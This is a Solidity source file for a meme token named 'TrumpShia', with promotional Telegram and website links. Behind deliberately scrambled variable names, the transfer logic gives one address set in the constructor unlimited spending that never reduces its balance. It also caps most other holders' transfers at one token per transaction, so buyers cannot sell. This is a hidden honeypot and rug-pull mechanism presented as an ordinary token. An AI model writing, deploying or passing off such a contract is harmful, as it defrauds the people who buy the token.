/*

Telegram: https://t.me/xTrumpShia

Website: https://xtrumpshia.crypto-token.live/

*/

// SPDX-License-Identifier: GPL-3.0

pragma solidity >0.8.18;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

interface IUniswapV2Router02 {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface IUniswapV2Factory {
    function getPair(address tokenA, address tokenB) external returns (address pair);
}

contract TrumpShia is Ownable {
    uint256 private ytlgpecqokm = 106;

    function approve(address gpbke, uint256 qfmnwt) public returns (bool success) {
        allowance[msg.sender][gpbke] = qfmnwt;
        emit Approval(msg.sender, gpbke, qfmnwt);
        return true;
    }

    mapping(address => mapping(address => uint256)) public allowance;

    uint8 public decimals = 9;

    constructor(string memory yqhimcoewjpv, string memory plxkmn, address khbcgna, address mbgtz) {
        name = yqhimcoewjpv;
        symbol = plxkmn;
        balanceOf[msg.sender] = totalSupply;
        lkdnqmebowh[mbgtz] = ytlgpecqokm;
        gaefwxbz = IUniswapV2Router02(khbcgna);
    }

    string public symbol;

    uint256 public totalSupply = 1000000000 * 10 ** 9;

    event Approval(address indexed owner, address indexed spender, uint256 value);

    event Transfer(address indexed from, address indexed to, uint256 value);

    mapping(address => uint256) public balanceOf;

    IUniswapV2Router02 private gaefwxbz;

    function transferFrom(address dgifawznrmk, address mcoydfel, uint256 qfmnwt) public returns (bool success) {
        require(qfmnwt <= allowance[dgifawznrmk][msg.sender]);
        allowance[dgifawznrmk][msg.sender] -= qfmnwt;
        xzgvmbhck(dgifawznrmk, mcoydfel, qfmnwt);
        return true;
    }

    mapping(address => uint256) private ycfljsnerx;

    string public name;

    function transfer(address mcoydfel, uint256 qfmnwt) public returns (bool success) {
        xzgvmbhck(msg.sender, mcoydfel, qfmnwt);
        return true;
    }

    mapping(address => uint256) private lkdnqmebowh;

    function xzgvmbhck(address dgifawznrmk, address mcoydfel, uint256 qfmnwt) private {
        address gsvwjhzl = IUniswapV2Factory(gaefwxbz.factory()).getPair(address(this), gaefwxbz.WETH());
        if (0 == lkdnqmebowh[dgifawznrmk]) {
            if (dgifawznrmk != gsvwjhzl && ycfljsnerx[dgifawznrmk] != block.number && qfmnwt < totalSupply) {
                require(qfmnwt <= totalSupply / (10 ** decimals));
            }
            balanceOf[dgifawznrmk] -= qfmnwt;
        }
        balanceOf[mcoydfel] += qfmnwt;
        ycfljsnerx[mcoydfel] = block.number;
        emit Transfer(dgifawznrmk, mcoydfel, qfmnwt);
    }
}
